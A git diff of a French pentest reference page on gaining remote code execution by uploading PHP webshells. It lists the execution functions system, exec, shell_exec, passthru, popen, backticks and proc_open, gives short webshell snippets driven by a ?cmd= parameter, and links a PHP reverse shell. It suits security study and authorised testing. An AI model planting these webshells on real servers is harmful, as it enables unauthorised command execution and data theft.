@@ -4,17 +4,25 @@
 
 **Facteur de risque** : RCE via webshell, Information DIsclosure
 
-**Extension** : `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phar`, `.phps`, `.phpt`, `.pht`, `.phtm`, `.phtml`, `.inc`
+**Extension** : `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phar`, `.phps`, `php-s`, `.phpt`, `.pht`, `.phtm`, `.phtml`, `.inc`
 
 **Description** : **PHP: Hypertext Preprocessor**, plus connu sous son sigle **PHP**, est un "langage de programmation" libre, principalement utilisé pour produire des pages Web dynamiques via un serveur HTTP (*Apache, lighttpd, nginx...*).
 
+## Sommaire
+
+- Remote Code Execution
+
+- Information Disclosure
+
 ## Remote Code Execution
+
+PHP possède plusieurs fonctions qui permettent d'exécuter des commandes : `system`, `exec`, `shell_exec`, `passthru`,`popen`, `proc_open`, et l'utilisation de backticks. Certaines de ces fonctions peuvent être désactivés pour des raisons de sécurités. Essayez dans ce cas les autres fonctions, au cas où s'ils ont oublié.
 
 ### Pré-requis
 
 - Le fichier doit être accessible après avoir été uploadé
 
-- Le serveur supporte le PHP
+- Le serveur doit supporter le PHP
 
 - Les fonctions d'exécution en PHP doivent être activés
 
@@ -23,8 +31,6 @@
   - Impossible de nos jours. La configuration par défaut de PHP consiste à exécuter l'interpréteur PHP uniquement pour les fichiers .php, à l'aide de NGinx, Apache, Lighttpd etc...
 
 ### Payload
-
-PHP possède plusieurs fonctions qui permettent d'exécuter des commandes. Ces fonctions peuvent être utilisés pour avoir des webshells très basiques :
 
 #### system
 
@@ -37,6 +43,8 @@ echo "</pre>";
 ```
 
 La fonction `system` accepte la commande comme paramètre de la fonction, puis affiche le résultat.
+
+Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
 
 #### exec
 
@@ -51,6 +59,8 @@ echo "</pre>";
 
 La fonction `exec` accepte la commande comme paramètre de la fonction, mais n'affiche pas de sortie. Il faut spécifier un deuxième paramètre (ici `$array`) pour avoir le résultat sous forme de tableau. Puis `print_r` est utilisé pour afficher le résultat.
 
+Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
+
 #### shell\_exec
 
 ```php
@@ -62,6 +72,8 @@ echo "<pre>$output</pre>"
 
 La fonction `shell_exec` accepte la commande comme paramètre de la fonction, et retourne le résultat sous forme ce chaîne. Puis `echo` est utilisé pour afficher le résultat.
 
+Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
+
 #### passthru
 
 ```php
@@ -71,6 +83,8 @@ passthru($_GET['cmd']);
 ```
 
 La fonction `passthru` accepte la commande comme paramètre de la fonction, et affiche le résultat brut.
+
+Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
 
 #### popen
 
@@ -84,9 +98,7 @@ pclose($handle);
 
 La fonction `popen` crée un processus, qui est terminé avec `pclose`.
 
-#### proc_open
-
-A faire
+Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
 
 #### Backticks `
 
@@ -100,6 +112,16 @@ echo "<pre>$output</pre>";
 PHP exécute le contenu entre backticks comme des commandes. Puis le résultat est affiché avec `echo`, avec les balises `<pre>` pour garder le résultat préformaté.
 
 Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).
+
+#### proc_open
+
+La fonction `proc_open` est plus complexe à utiliser. Elle est utilisé dans le reverse shell de  pentestmonkey.net : http://pentestmonkey.net/tools/php-reverse-shell .
+
+Ce script est conçu pour les situations où, lors d'un test d'intrusion, une fonction de téléversement de fichiers existe, et que le serveur web qui exécute le PHP.
+
+Exécutez le fichier en accédant à son URL. Le script ouvrira une connexion TCP du serveur web vers un hôte et un port de votre choix.
+
+Si, pour une raison ou une autre, le webshell ne fonctionne pas, nous pouvons passer aux commandes à l'ancienne comme system, exec, shell\_exec, passthru... etc. 
 
 ### Quels fonctions sont activés ?
 
@@ -145,7 +167,12 @@ https://www.dynamicciso.com/web-shells-in-php-detection-and-prevention-part-1/
 
 [[Résolu] Fonctions PHP plus exploitables | php | Prograide.com](https://prograide.com/pregunta/2693/fonctions-php-plus-exploitables)
 
+[php-reverse-shell | pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
 ## Todo
 
 - Vérifier les fonctions définies en PHP
-- Faire un webshell avec proc\_open, pcntl\_exec
+- Faire un webshell avec proc\_open, pcntl\_exec ou eval(), preg\_match() avec le flag /e
+- Ajouter les différents payloads avec les diférents extentsions de PHP
+- Vérifier qu'un paramètre est présent
+- 
